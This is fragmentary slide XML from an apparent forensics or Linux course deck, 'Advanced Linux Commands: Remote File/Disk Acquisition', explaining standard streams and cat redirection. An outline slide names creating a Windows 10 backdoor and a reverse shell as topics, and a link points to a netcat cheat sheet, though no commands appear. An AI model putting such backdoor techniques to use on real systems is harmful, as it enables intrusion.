Target="../slideLayouts/slideLayout6.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink19.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image291.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image36.png"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image311.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink21.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image33.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image35.png"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image280.png"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink23.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide26.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330.png"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink34.xml"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink38.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image42.png"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image370.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image300.png"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink31.xml"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image350.png"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image390.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image40.png"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink33.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink35.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout7.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink28.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image320.png"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink37.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image290.png"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image340.png"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image380.png"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink39.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink30.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image360.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink27.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image310.png"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink32.xml"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink36.xml"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4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 Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nmap.org/download"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hyperlink" Target="https://en.wikipedia.org/wiki/Standard_streams" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.learnlinux.org.za/courses/build/shell-scripting/ch01s04.html" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.computerhope.com/unix/nc.htm" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.brianstorti.com/understanding-shell-script-idiom-redire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lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Advanced Linux Commands</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Subtitle 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F2871076-CFC8-4CD5-BF65-ECB4ACAEF8D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Remote File/Disk Acquisition</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13250612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D4BDF-0DE5-09BD-9D84-5B31B3A1A165}"/>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791C76E6-6D86-29EF-DD53-CB8A670CA499}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Standard input/output/error devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Network utilities use standard devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Create a backdoor at Windows 10/Remote File Acquisition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reverse shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Remote disk acquisition</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1504836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Standard input/output/error devices</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16338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753199-C999-4C1F-8E71-71D4B05B93DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Input and output devices are files (0,1,2)!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Slide Number Placeholder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:fld id="{00000000-1234-1234-1234-123412341234}" type="slidenum">
              <a:rPr lang="en" smtClean="0"/>
              <a:pPr algn="ctr"/>
              <a:t>4</a:t>
            </a:fld>
            <a:endParaRPr lang="en"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006568" y="2428139"/>
            <a:ext cx="5689840" cy="3647732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Oval 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612186" y="3584844"/>
            <a:ext cx="2017381" cy="1087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Process</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6313482" y="3014715"/>
            <a:ext cx="2017514" cy="72801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Keyboard/file</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6313482" y="4308470"/>
            <a:ext cx="1806872" cy="728012"/>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en-US" sz="2400" dirty="0"/>
              <a:t>Display/file</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="Straight Arrow Connector 10"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:endCxn id="12" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4448980" y="3277852"/>
            <a:ext cx="1741706" cy="8155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2" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3020384" y="3128571"/>
            <a:ext cx="1428596" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0&lt;    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>input</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3855063" y="4308470"/>
            <a:ext cx="2458419" cy="364005"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="7030A0"/>
            </a:solidFill>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent6"/>
          </a:lnRef>
          <a:fillRef idx="0">
            <a:schemeClr val="accent6"/>
          </a:fillRef>
          <a:effectRef idx="0">
            <a:schemeClr val="accent6"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="tx1"/>
          </a:fontRef>
        </p:style>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="17" name="Elbow Connector 16"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5006568" y="4920263"/>
            <a:ext cx="1306914" cy="315974"/>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315822" y="3874919"/>
            <a:ext cx="1691489" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1&gt;     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>output</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="TextBox 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2892657" y="5057935"/>
            <a:ext cx="2060179" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2&gt;    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>err output</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7948123A-D870-4BDE-9461-61E542D4231B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1617366" y="1885730"/>
            <a:ext cx="2831614" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>FILE_</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>DESCRIPTOR 0,1,2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="7" name="Straight Arrow Connector 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{668D3B19-1B49-4642-AA68-914F4B576A5D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="15" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3033173" y="2255062"/>
            <a:ext cx="225842" cy="759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8817267-0AE1-4201-B235-FE819981F7BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="15" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3033173" y="2255062"/>
            <a:ext cx="176265" cy="17573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AD02304-3AA7-4BE6-ADE4-9A6A9AD6BDEE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="15" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3020385" y="2255062"/>
            <a:ext cx="12788" cy="27244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Document outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E8B751FF-E3B2-4E2C-9A07-0B8C74975A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20282" y="3029594"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="23" name="Graphic 22" descr="Document outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{193E8457-634C-4969-8489-9B765DF3E7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125865" y="3810178"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="24" name="Graphic 23" descr="Document outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3C53C358-2B72-4BAB-A0E3-60E4D8B801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61192" y="4779037"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="27" name="Elbow Connector 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ECF64E2B-67BE-486D-8D10-C772477498DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="5" idx="4"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1620877" y="4672476"/>
            <a:ext cx="1267883" cy="616291"/>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756F8C3-3F4E-45B7-BE04-DD7F97537D17}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2607073" y="4147440"/>
            <a:ext cx="743192" cy="78500"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="7030A0"/>
            </a:solidFill>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent6"/>
          </a:lnRef>
          <a:fillRef idx="0">
            <a:schemeClr val="accent6"/>
          </a:fillRef>
          <a:effectRef idx="0">
            <a:schemeClr val="accent6"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="tx1"/>
          </a:fontRef>
        </p:style>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="33" name="Straight Arrow Connector 32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{27D77B53-BE89-4FFD-BF82-B11ACA988712}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:endCxn id="5" idx="7"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2334128" y="3508684"/>
            <a:ext cx="658544" cy="23544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pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD4FB5A9-3D63-1490-9F12-FA8A4270B582}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1407573" y="1392572"/>
            <a:ext cx="3251200" cy="469900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="969276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Standard input: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stdin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Oval 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="956063" y="2631367"/>
            <a:ext cx="2017381" cy="1087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cat</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="Straight Arrow Connector 10"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="5" idx="7"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2678006" y="2324375"/>
            <a:ext cx="3856556" cy="46627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2" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3364261" y="2175094"/>
            <a:ext cx="1428596" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0&lt;    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>input</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6633725" y="1345083"/>
            <a:ext cx="4801271" cy="2070389"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="852426" y="4395675"/>
            <a:ext cx="9932463" cy="1692771"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Display the content of a file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457189" indent="-457189">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>tell cat to take input from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>myfile.txt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>directly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457189" indent="-457189">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Send the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>myflle.txt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>content to the input device (0),  tell cat to take input from the device, </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457189" indent="-457189">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Same as 2 (0 is a default input device)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Graphic 9" descr="Document outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2039D276-9706-43EB-83A2-1A66F8880A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5387" y="2005125"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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0682F64C-86ED-FDF8-AC44-630D4AC5A445}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="807927" y="5478372"/>
              <a:ext cx="402840" cy="352440"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="15" name="Ink 14">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0682F64C-86ED-FDF8-AC44-630D4AC5A445}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId6"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="798919" y="5469363"/>
